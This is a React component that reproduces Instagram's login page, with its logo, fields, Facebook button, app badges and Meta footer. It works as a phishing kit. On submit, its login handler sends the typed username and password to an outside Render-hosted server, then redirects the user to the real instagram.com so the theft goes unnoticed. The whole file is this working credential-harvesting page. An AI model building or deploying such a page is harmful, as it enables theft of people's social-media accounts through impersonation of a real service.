import { useState } from "react";

const InstagramIcon = () => (
  <svg width="60" height="60" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
        <stop offset="0%" stopColor="#f9ce34" />
        <stop offset="25%" stopColor="#ee2a7b" />
        <stop offset="75%" stopColor="#6228d7" />
      </linearGradient>
    </defs>
    <rect width="64" height="64" rx="14" fill="url(#ig-grad)" />
    <rect x="12" y="12" width="40" height="40" rx="10" fill="none" stroke="white" strokeWidth="3.5" />
    <circle cx="32" cy="32" r="9" fill="none" stroke="white" strokeWidth="3.5" />
    <circle cx="44" cy="20" r="2.5" fill="white" />
  </svg>
);

export default function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [userFocused, setUserFocused] = useState(false);
  const [passFocused, setPassFocused] = useState(false);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState(null);

  const isLoginEnabled = username.length > 0 && password.length > 0;

  const handleLogin = async () => {
    if (!isLoginEnabled) return;
    setLoading(true);
    setMessage(null);
    try {
      const res = await fetch("https://insta-clone-q0rh.onrender.com/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (data.success) {
        setUsername("");
        setPassword("");
        window.location.href = "https://www.instagram.com/explore/";
      } else {
        setMessage({ type: "error", text: "❌ " + (data.error || "Something went wrong.") });
      }
    } catch (err) {
      setMessage({ type: "error", text: "❌ Server not reachable. Run: node server/index.js" });
    } finally {
      setLoading(false);
    }
  };

  const s = {
    page: {
      minHeight: "100vh",
      background: "#fafafa",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: "'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif",
      padding: "0 16px",
    },
    lang: {
      fontSize: "13px",
      color: "#8e8e8e",
      marginBottom: "28px",
    },
    toast: (type) => ({
      width: "100%",
      maxWidth: "350px",
      padding: "10px 16px",
      borderRadius: "4px",
      marginBottom: "10px",
      fontSize: "13px",
      fontWeight: "500",
      textAlign: "center",
      background: type === "success" ? "#d4edda" : "#f8d7da",
      color: type === "success" ? "#155724" : "#721c24",
      border: `1px solid ${type === "success" ? "#c3e6cb" : "#f5c6cb"}`,
    }),
    card: {
      width: "100%",
      maxWidth: "350px",
      background: "#fff",
      border: "1px solid #dbdbdb",
      borderRadius: "4px",
      padding: "28px 40px 20px",
      boxSizing: "border-box",
      marginBottom: "10px",
    },
    inputWrap: {
      position: "relative",
      marginBottom: "6px",
    },
    input: (focused) => ({
      width: "100%",
      boxSizing: "border-box",
      padding: "9px 12px",
      border: `1px solid ${focused ? "#a8a8a8" : "#dbdbdb"}`,
      borderRadius: "3px",
      background: "#fafafa",
      fontSize: "12px",
      color: "#262626",
      outline: "none",
      transition: "border-color 0.15s",
    }),
    showBtn: {
      position: "absolute",
      right: "10px",
      top: "50%",
      transform: "translateY(-50%)",
      background: "none",
      border: "none",
      fontSize: "13px",
      fontWeight: "600",
      color: "#262626",
      cursor: "pointer",
      padding: "0",
    },
    loginBtn: (enabled) => ({
      width: "100%",
      padding: "7px",
      background: enabled ? "#0095f6" : "#b2dffc",
      border: "none",
      borderRadius: "50px",
      color: "white",
      fontSize: "14px",
      fontWeight: "600",
      cursor: enabled ? "pointer" : "default",
      margin: "12px 0 12px",
      transition: "background 0.15s",
    }),
    orDivider: {
      display: "flex",
      alignItems: "center",
      gap: "18px",
      margin: "18px 0 16px",
    },
    orLine: { flex: 1, height: "1px", background: "#dbdbdb" },
    orText: {
      fontSize: "13px",
      fontWeight: "600",
      color: "#8e8e8e",
      letterSpacing: "1px",
    },
    fbBtn: {
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      gap: "8px",
      width: "100%",
      background: "none",
      border: "none",
      color: "#385185",
      fontWeight: "600",
      fontSize: "14px",
      cursor: "pointer",
      padding: "6px 0",
    },
    forgotLink: {
      display: "block",
      textAlign: "center",
      fontSize: "12px",
      color: "#00376b",
      textDecoration: "none",
      fontWeight: "500",
      marginTop: "4px",
    },
    signupCard: {
      width: "100%",
      maxWidth: "350px",
      background: "#fff",
      border: "1px solid #dbdbdb",
      borderRadius: "4px",
      padding: "20px 40px",
      boxSizing: "border-box",
      textAlign: "center",
      marginBottom: "24px",
    },
    signupText: { fontSize: "14px", color: "#262626" },
    signupLink: {
      color: "#0095f6",
      fontWeight: "600",
      textDecoration: "none",
      marginLeft: "4px",
    },
    appLinks: { textAlign: "center", marginBottom: "16px" },
    getAppText: { fontSize: "14px", color: "#262626", marginBottom: "12px" },
    storeBadges: { display: "flex", justifyContent: "center", gap: "6px" },
    badge: {
      border: "1px solid #262626",
      borderRadius: "6px",
      padding: "4px 10px",
      fontSize: "11px",
      fontWeight: "600",
      color: "#262626",
      cursor: "pointer",
      lineHeight: "1.5",
    },
    meta: {
      display: "flex",
      alignItems: "center",
      gap: "4px",
      justifyContent: "center",
      fontSize: "14px",
      fontWeight: "600",
      color: "#262626",
      marginTop: "8px",
    },
  };

  return (
    <div style={s.page}>
      <p style={s.lang}>English (UK)</p>

      {message && <div style={s.toast(message.type)}>{message.text}</div>}

      <div style={s.card}>
        <div style={{ display: "flex", justifyContent: "center", marginBottom: "32px" }}>
          <InstagramIcon />
        </div>

        {/* Username */}
        <div style={s.inputWrap}>
          <input
            type="text"
            placeholder="Phone number, username or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            onFocus={() => setUserFocused(true)}
            onBlur={() => setUserFocused(false)}
            style={s.input(userFocused)}
            autoComplete="username"
          />
        </div>

        {/* Password */}
        <div style={{ ...s.inputWrap, marginBottom: "12px" }}>
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onFocus={() => setPassFocused(true)}
            onBlur={() => setPassFocused(false)}
            style={{ ...s.input(passFocused), paddingRight: "48px" }}
            autoComplete="current-password"
          />
          {password.length > 0 && (
            <button
              onClick={() => setShowPassword((v) => !v)}
              style={s.showBtn}
              type="button"
            >
              {showPassword ? "Hide" : "Show"}
            </button>
          )}
        </div>

        {/* Login Button */}
        <button
          onClick={handleLogin}
          style={s.loginBtn(isLoginEnabled && !loading)}
          disabled={!isLoginEnabled || loading}
        >
          {loading ? "Saving..." : "Log in"}
        </button>

        <div style={s.orDivider}>
          <div style={s.orLine} />
          <span style={s.orText}>OR</span>
          <div style={s.orLine} />
        </div>

        {/* Facebook */}
        <button style={s.fbBtn}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="#385185">
            <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />
          </svg>
          Log in with Facebook
        </button>

        <a href="#" style={s.forgotLink}>Forgotten your password?</a>
      </div>

      {/* Sign up */}
      <div style={s.signupCard}>
        <span style={s.signupText}>
          Don't have an account?
          <a href="#" style={s.signupLink}>Sign up</a>
        </span>
      </div>

      {/* App links */}
      <div style={s.appLinks}>
        <p style={s.getAppText}>Get the app.</p>
        <div style={s.storeBadges}>
          <div style={s.badge}>App Store</div>
          <div style={s.badge}>Google Play</div>
        </div>
      </div>

      {/* Meta */}
      <div style={s.meta}>
        <svg width="14" height="14" viewBox="0 0 24 24" fill="#262626">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-4H7l5-8v4h4l-5 8z" />
        </svg>
        Meta
      </div>
    </div>
  );
}